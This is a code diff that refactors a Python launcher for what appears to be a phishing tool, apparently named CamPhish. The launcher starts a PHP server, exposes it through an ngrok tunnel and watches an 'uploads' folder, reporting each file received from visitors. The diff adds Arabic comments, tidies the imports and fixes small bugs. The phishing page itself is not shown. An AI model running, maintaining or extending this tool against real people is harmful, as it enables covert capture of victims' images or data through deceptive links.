@@ -1,18 +1,32 @@
-import subprocess,time,re,shutil,sys,os,random
+import subprocess
+import time
+import re
+import shutil
+import sys
+import os
+import random
 from datetime import datetime
+
+# ===================== تصحيح استيراد المكتبات =====================
+# محاولة استيراد watchdog مع إعادة المحاولة بعد التثبيت
 try:
     from watchdog.observers import Observer
     from watchdog.events import FileSystemEventHandler
-except:
+except ImportError:
     os.system('pip install watchdog')
+    from watchdog.observers import Observer
+    from watchdog.events import FileSystemEventHandler
+
+# محاولة استيراد colorama مع إعادة المحاولة بعد التثبيت
 try:
-    from colorama import init,Fore
-except:
+    from colorama import init, Fore
+except ImportError:
     os.system('pip install colorama')
+    from colorama import init, Fore
 
-init()  
+init()  # تهيئة colorama
 
-
+# ===================== الإعدادات الأساسية =====================
 colors = {
     "red": '\033[00;31m',
     "green": '\033[00;32m',
@@ -32,13 +46,13 @@ messages = {
     "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
 }
 
-PHP_PORT = random.randint(8000,8999)
-PHP_FOLDER = "./"  
+PHP_PORT = random.randint(8000, 8999)
+PHP_FOLDER = "./"
 FOLDER_TO_WATCH = "uploads"
 INDEX = "index.html"
 TOKEN_FILE = "token.txt"
-# -------------------------------------------------------------------
 
+# ===================== دوال مساعدة =====================
 def clear():
     os.system("cls || clear")
 
@@ -47,13 +61,15 @@ def OS():
 
 clear()
 
+# التحقق من وجود PHP
 if not shutil.which("php"):
     if OS():
         subprocess.run(["pkg", "install", "php"])
     elif 'Linux' in __import__("platform").system():
-        subprocess.run(["sudo", "apt", "install","php"])
+        subprocess.run(["sudo", "apt", "install", "php"])
     print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")
 
+# التحقق من وجود ngrok
 if not shutil.which("ngrok"):
     sys.exit(f"\n{messages['error']}ngrok is NOT installed!\n\nInstall On windows: winget install ngrok -s msstore\nOr Download Portable: https://ngrok.com/download/windows?tab=download\n\nInstall On Termux: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nInstall On Linux: https://ngrok.com/download/linux\n\nAnd then add your token (ngrok config add-authtoken <token>)")
 
@@ -62,13 +78,14 @@ def tokenngrok():
         with open(TOKEN_FILE, "r") as f:
             token = f.read().strip()
         return token if token else None
-    
+    return None
+
 user = os.popen("whoami").read().strip()
 os.environ["USER"] = user
 
 if OS():
-    os.environ["HOME"] = os.environ.get("HOME") 
-    b = f"""{colors['cyan']}                                                                                           
+    os.environ["HOME"] = os.environ.get("HOME")
+    banner = f"""{colors['cyan']}                                                                                           
 ▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
 ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
 ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
@@ -78,7 +95,7 @@ if OS():
 else:
     if 'Linux' in __import__("platform").system():
         os.environ["HOME"] = f"/home/{user}"
-    b = f"""{colors['cyan']}
+    banner = f"""{colors['cyan']}
        _..._                                                                                          
     .-'_..._''.                                                                                       
   .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
@@ -96,9 +113,10 @@ else:
                 {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n
                  """
 
-print (b)
-token = tokenngrok()
+print(banner)
 
+# إعداد token ngrok
+token = tokenngrok()
 if not token:
     user_token = input(f"{messages['true']}Enter Token Ngrok: {colors['reset']}")
     with open(TOKEN_FILE, "w") as f:
@@ -106,8 +124,9 @@ if not token:
     subprocess.run(["ngrok", "config", "add-authtoken", user_token])
 
 clear()
-print (b)
+print(banner)
 
+# تعديل إعدادات index.html إذا أراد المستخدم
 forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()
 
 if forindex == "Y":
@@ -132,9 +151,10 @@ if forindex == "Y":
 
     with open(INDEX, 'w', encoding='utf-8') as file:
         file.write(content)
-    clear
-    print(b)
+    clear()  # تم تصحيح استدعاء الدالة
+    print(banner)
 
+# ===================== تشغيل الخوادم =====================
 def php_server():
     print(f"{messages['true']}Starting PHP server on port {colors['yellow']}{PHP_PORT}{colors['reset']}...")
     php_proc = subprocess.Popen(
@@ -154,7 +174,7 @@ def ngrok(port):
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE
     )
-    time.sleep(8)  
+    time.sleep(8)
     return ngrok_proc
 
 def ngrok_url():
@@ -177,6 +197,7 @@ def ngrok_url():
         print(f"\n{messages['error']}Error:", e)
         return None
 
+# ===================== مراقبة مجلد uploads =====================
 class WatcherHandler(FileSystemEventHandler):
     def on_created(self, event):
         if not event.is_directory:
@@ -185,6 +206,9 @@ class WatcherHandler(FileSystemEventHandler):
             print(f"\n{messages['true']}File received: {colors['green']}{file_name} {colors['red']}at {colors['yellow']}{current_time}")
 
 if __name__ == "__main__":
+    # إنشاء مجلد uploads إذا لم يكن موجوداً
+    if not os.path.exists(FOLDER_TO_WATCH):
+        os.makedirs(FOLDER_TO_WATCH)
 
     php_proc = php_server()
     ngrok_proc = ngrok(PHP_PORT)
@@ -204,5 +228,4 @@ if __name__ == "__main__":
         php_proc.terminate()
         ngrok_proc.terminate()
         observer.stop()
-
         observer.join()
